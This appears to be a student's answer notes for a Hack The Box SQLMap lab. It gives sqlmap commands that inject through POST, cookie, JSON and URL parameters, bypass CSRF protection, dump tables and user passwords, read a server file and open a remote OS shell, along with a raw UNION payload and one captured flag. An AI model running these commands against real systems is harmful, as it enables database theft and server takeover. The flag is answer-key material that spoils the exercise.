1.  What's the contents of table flag2? (Case #2)

- vulnerable in Post data `id`

```sh
❯ sqlmap 'http://167.99.89.94:30884/case2.php'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   -H 'Accept-Language: en-US,en;q=0.9'   -H 'Cache-Control: max-age=0'   -H 'Connection: keep-alive'   -H 'Content-Type: application/x-www-form-urlencoded'   -H 'Origin: http://167.99.89.94:30884'   -H 'Referer: http://167.99.89.94:30884/case2.php'   -H 'Upgrade-Insecure-Requests: 1'   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'   --data-raw 'id=1*'   --compressed --tables
```

- found flag2 and user table

```sh
❯ sqlmap ... -T flag2 --dump
```

---

2. What's the contents of table flag3? (Case #3)

- vulnerable in cookie value `id`

```sh
❯ sqlmap 'http://167.99.89.94:30884/case3.php'   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   -H 'Accept-Language: en-US,en;q=0.9'   -H 'Connection: keep-alive'   -H 'Cookie: id=1*'   -H 'Referer: http://167.99.89.94:30884/case3.php'   -H 'Upgrade-Insecure-Requests: 1'   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36'   --compressed --tables
```

- found flag3 and user table

```sh
❯ sqlmap ...  -T flag3 --dump
```

---

3. What's the contents of table flag4? (Case #4)

- vulnerable in JSON data {"id": 1}
- write case4.txt file as below

```
POST /case4.php HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Content-Length: 8
Content-Type: application/json
Host: 167.99.89.94:32587
Origin: http://167.99.89.94:32587
Referer: http://167.99.89.94:32587/case4.php
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36

{"id":1*}
```

```sh
sqlmap -r case4.txt --tables
sqlmap -r case4.txt -T flag4 --dump
```

---

4. What's the contents of table flag5? (Case #5)

```
HTB{700_much_r15k_bu7_w0r7h_17}
```

5. What's the contents of table flag6? (Case #6)

```bash
sqlmap 'http://161.35.36.93:32602/case6.php?col=id*'   \
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'   \
    -H 'Accept-Language: en-US,en;q=0.9'   \
    -H 'Cache-Control: max-age=0'   \
    -H 'Connection: keep-alive'   \
    -H 'Upgrade-Insecure-Requests: 1'   \
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
    --risk=3
    --level=5
    -v 4
    --prefix='`)'
    -T flag6 --dump
```

6. What's the contents of table flag6? (Case #7)

```bash
sqlmap 'http://161.35.36.93:32602/case7.php?id=1*'
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
    -H 'Accept-Language: en-US,en;q=0.9'
    -H 'Cache-Control: max-age=0'
    -H 'Connection: keep-alive'
    -H 'Upgrade-Insecure-Requests: 1'
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
    --level=5
    --risk=3
    --technique=U
    -v 5
    --union-cols=5
    --threads=10
    -T flag7
    --dump
```

```
'http://161.35.36.93:32602/case7.php?id=1 UNION ALL SELECT CONCAT(0x716a787171,IFNULL(CAST(content AS NCHAR),0x20),0x726970667372,IFNULL(CAST(id AS NCHAR),0x20),0x7171707071),NULL,NULL,NULL,NULL FROM testdb.flag7-- -'
```

7. What's the contents of table flag1 in the testdb database? (Case #1)

```bash
sqlmap 'http://178.62.88.12:31405/case1.php?id=1*'
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
    -H 'Accept-Language: en-US,en;q=0.9'
    -H 'Cache-Control: max-age=0'
    -H 'Connection: keep-alive'
    -H 'Upgrade-Insecure-Requests: 1'
    -D testdb
    -T flag1
    --dump
    --threads=10
```

8. What's the name of the column containing "style" in its' name? (Case #1)

```bash
sqlmap 'http://178.62.88.12:31405/case1.php?id=1*'
    --search -C style
```

9. What is the password for Kimberly? (Case #1)

```bash
sqlmap 'http://178.62.88.12:31405/case1.php?id=1*'
    --threads=10
    -v 3
    -T users -C name,password --dump
```

10. What's the contents of table flag8? (Case #8)

```bash
sqlmap 'http://178.62.88.12:31405/case8.php'
    --data-raw 'id=1*&t0ken=CYT5Uz6uLZhvoCJzmOAKmyks472OipNo6XgoaxNP2o' --csrf-token="t0ken" -T flag8 --dump -v 2
```

11. What's the contents of table flag9? (Case #9)

```bash
sqlmap 'http://178.62.88.12:31405/case9.php?id=1*&uid=1432506057'
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
    -H 'Accept-Language: en-US,en;q=0.9'
    -H 'Connection: keep-alive'
    -H 'Cookie: PHPSESSID=4r2b2qaa3eorug4mdsd57m0hi6'
    --randomize=uid -v 2 -T flag9 --dump
```

12. What's the contents of table flag10? (Case #10)

```bash
sqlmap 'http://178.62.88.12:31405/case10.php'
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
    -H 'Accept-Language: en-US,en;q=0.9'
    -H 'Cache-Control: max-age=0'
    -H 'Connection: keep-alive'
    -H 'Content-Type: application/x-www-form-urlencoded'
    -H 'Cookie: PHPSESSID=4r2b2qaa3eorug4mdsd57m0hi6'
    -H 'Origin: http://178.62.88.12:31405'
    -H 'Referer: http://178.62.88.12:31405/case10.php'
    -H 'Upgrade-Insecure-Requests: 1'
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
    --data-raw 'id=1*' -T flag10 --dump
```

13. What's the contents of table flag11? (Case #11)

```bash
sqlmap 'http://178.62.88.144:31615/case11.php?id=1'
    -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9'
    -H 'Accept-Language: en-US,en;q=0.9'
    -H 'Cache-Control: max-age=0'
    -H 'Connection: keep-alive'
    -H 'Referer: http://178.62.88.144:31615/case11.php'
    -H 'Upgrade-Insecure-Requests: 1'
    -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'
    --union-cols=9
    -T flag11
    --dump
    --threads=10
    --tamper=between
    -v 3
```

14. Try to use SQLMap to read the file "/var/www/html/flag.txt".

```sh
sqlmap 'http://178.62.88.151:30349/?id=1' --file-read "/var/www/html/flag.txt"
```

15. Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.

```sh
sqlmap 'http://178.62.88.151:30349/?id=1' --os-shell --technique=E
```

16. What's the contents of table final_flag?

```sh

```
